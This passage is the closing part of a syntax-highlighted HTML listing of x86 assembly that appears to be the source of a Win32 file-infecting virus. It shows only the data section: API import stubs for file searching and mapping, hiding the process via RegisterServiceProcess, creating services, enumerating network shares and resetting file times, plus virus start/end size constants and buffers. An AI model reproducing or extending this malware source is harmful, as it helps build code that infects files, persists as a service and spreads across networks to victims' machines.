</span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetCurrentProcessId</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'GetCurrentProcessId'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetDriveTypeA</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'GetDriveTypeA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetTickCount</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'GetTickCount'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LoadLibraryA</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFileTime</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Sleep</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'Sleep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VirtualAlloc</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'VirtualAlloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VirtualFree</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'VirtualFree'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; this function does only exist under Win9x</span><span class="sc0">

                          </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RegisterServiceProcess</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'RegisterServiceProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">USER32_Name</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'USER32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RegisterClassA</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'RegisterClassA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ADVAPI32_Name</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'ADVAPI32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ADVAPI32_Functions</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">OpenSCManagerA</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'OpenSCManagerA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OpenServiceA</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'OpenServiceA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateServiceA</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'CreateServiceA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">StartServiceA</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'StartServiceA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">StartServiceCtrlDispatcherA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'StartServiceCtrlDispatcherA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RegisterServiceCtrlHandlerA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'RegisterServiceCtrlHandlerA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetServiceStatus</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'SetServiceStatus'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">MPR_Name</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc12">'MPR.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">MPR_Functions</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">WNetOpenEnumA</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'WNetOpenEnumA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WNetEnumResourceA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'WNetEnumResourceA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WNetCloseEnum</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">0B8</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc2">0FF</span><span class="sc4">,</span><span class="sc2">0E0</span><span class="sc4">,</span><span class="sc12">'WNetCloseEnum'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">VEnd</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">
</span><span class="sc1">; -------------------------   UNINITIALIZED DATA   ------------------------ ;</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------------------------------- ;</span><span class="sc0">


</span><span class="sc5">Kernel32_Base</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Rand</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Tick</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">OS</span><span class="sc0">                        </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc9">ALIGN</span><span class="sc0">        </span><span class="sc2">100</span><span class="sc0">


</span><span class="sc5">Buffer1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Current Directory</span><span class="sc0">
</span><span class="sc5">Buffer2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">           </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Search Buffer</span><span class="sc0">
</span><span class="sc5">Buffer3</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">          </span><span class="sc2">2000</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Read Buffer</span><span class="sc0">


</span><span class="sc5">VSize</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc9">offset</span><span class="sc0">       </span><span class="sc5">VEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VStart</span><span class="sc0">

</span><span class="sc5">Phys_VSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc5">Virt_VSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">          </span><span class="sc2">4000</span><span class="sc0">


</span><span class="sc5">CODE</span><span class="sc0">         </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc9">END</span><span class="sc0">          </span><span class="sc5">main</span><span class="sc0">

</span></div></body>
</html>
